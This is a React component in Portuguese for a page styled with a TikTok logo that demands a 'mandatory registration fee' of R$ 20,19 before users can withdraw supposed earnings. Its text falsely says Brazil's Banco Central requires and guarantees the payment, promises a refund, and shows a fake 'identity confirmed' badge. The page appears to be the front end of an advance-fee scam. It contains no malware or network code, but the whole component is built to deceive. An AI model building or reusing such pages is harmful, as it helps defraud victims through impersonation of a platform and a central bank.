import { motion, Variants } from 'framer-motion';
import { 
    Clock, 
    RefreshCw, 
    Lock, 
    ShieldCheck, 
    ChevronRight,
    CircleCheck,
    Smartphone
} from 'lucide-react';
import TikTokLogo from '@/../components/TikTokLogo';

const contentVariants: Variants = {
    hidden: {
        opacity: 0,
        y: 12,
    },
    visible: {
        opacity: 1,
        y: 0,
        transition: {
            duration: 0.35,
            ease: 'easeOut',
        },
    },
};

interface RegistrationViewProps {
    onSubmit: () => void;
    taxValue?: string;
}

export const RegistrationView = ({ onSubmit, taxValue = '20.19' }: RegistrationViewProps) => {
    const features = [
        {
            icon: Clock,
            title: 'Taxa obrigatória',
            desc: 'Obrigatório para realizar o saque dos seus ganhos.',
        },
        {
            icon: RefreshCw,
            title: 'Valor reembolsável',
            desc: `Você recebe os R$ ${taxValue.replace('.', ',')} de volta após finalizar.`,
        },
        {
            icon: Lock,
            title: 'Garantia de segurança',
            desc: 'Seu pagamento é seguro e protegido pelo Banco Central do Brasil.',
        },
    ];

    return (
        <div className="flex min-h-screen items-center justify-center bg-gradient-to-br from-background via-background to-accent/30 p-0 sm:p-5">
            <motion.div
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                className="w-full max-w-[520px] overflow-hidden border border-border/40 bg-card shadow-2xl shadow-foreground/5 rounded-none sm:rounded-3xl"
            >
                <motion.div
                    initial={{ y: -30, opacity: 0 }}
                    animate={{ y: 0, opacity: 1 }}
                    className="bg-gradient-to-r from-primary via-primary to-primary/80 p-3.5 text-center text-xs font-bold uppercase tracking-wide text-primary-foreground"
                >
                    ⚠️ Atenção: Para realizar o saque é necessário validar sua identidade
                </motion.div>

                <div className="p-6">
                    <div className="flex flex-col items-center mb-6">
                        <TikTokLogo />
                        <div className="mt-4 flex items-center gap-2 rounded-full bg-green-500/10 px-4 py-1.5 border border-green-500/20">
                            <CircleCheck className="w-4 h-4 text-green-500" />
                            <span className="text-xs font-black text-green-600 uppercase tracking-widest">Identidade Confirmada</span>
                        </div>
                    </div>

                    <motion.div
                        variants={contentVariants}
                        initial="hidden"
                        animate="visible"
                        className="space-y-4"
                    >
                        <div className="text-center">
                            <h1 className="text-2xl font-black text-foreground uppercase tracking-tight leading-none mb-2">
                                Taxa de Cadastro <br />
                                <span className="text-primary">Obrigatória</span>
                            </h1>
                            <p className="text-xs text-muted-foreground leading-relaxed px-4">
                                Devido ao alto volume de tentativas de fraude, o Banco Central exige uma pequena taxa de validação para confirmar que você é um humano.
                            </p>
                        </div>

                        <div className="space-y-3 py-4">
                            {features.map((item, index) => (
                                <motion.div
                                    key={index}
                                    initial={{ opacity: 0, x: -10 }}
                                    animate={{ opacity: 1, x: 0 }}
                                    transition={{ delay: index * 0.1 }}
                                    className="flex items-start gap-4 p-4 rounded-2xl border border-border/40 bg-accent/20"
                                >
                                    <div className="w-10 h-10 rounded-xl bg-primary/10 flex items-center justify-center shrink-0">
                                        <item.icon className="w-5 h-5 text-primary" />
                                    </div>
                                    <div>
                                        <h3 className="text-sm font-bold text-foreground">{item.title}</h3>
                                        <p className="text-[11px] text-muted-foreground leading-tight">{item.desc}</p>
                                    </div>
                                </motion.div>
                            ))}
                        </div>

                        <div className="bg-primary/5 rounded-2xl p-5 border border-primary/10 text-center mb-6">
                            <div className="text-[10px] font-bold text-muted-foreground uppercase mb-1">Valor da Taxa</div>
                            <div className="text-3xl font-black text-primary">R$ {taxValue.replace('.', ',')}</div>
                            <div className="text-[10px] font-bold text-primary/60 uppercase mt-1">
                                (Será devolvido junto com seu saldo)
                            </div>
                        </div>

                        <motion.button
                            whileHover={{ scale: 1.02 }}
                            whileTap={{ scale: 0.98 }}
                            onClick={onSubmit}
                            className="w-full bg-primary text-primary-foreground py-4 rounded-2xl font-bold text-base shadow-xl shadow-primary/25 transition-all flex items-center justify-center gap-2"
                        >
                            REALIZAR VALIDAÇÃO AGORA
                            <ChevronRight className="w-5 h-5" />
                        </motion.button>

                        <div className="flex flex-col items-center gap-4 pt-4 opacity-60">
                            <div className="flex items-center gap-6">
                                <div className="flex items-center gap-1.5">
                                    <ShieldCheck className="w-3.5 h-3.5" />
                                    <span className="text-[9px] font-black tracking-widest uppercase">Seguro</span>
                                </div>
                                <div className="w-px h-3 bg-border" />
                                <div className="flex items-center gap-1.5">
                                    <Smartphone className="w-3.5 h-3.5" />
                                    <span className="text-[9px] font-black tracking-widest uppercase">Mobile Pay</span>
                                </div>
                            </div>
                        </div>
                    </motion.div>
                </div>
            </motion.div>
        </div>
    );
};
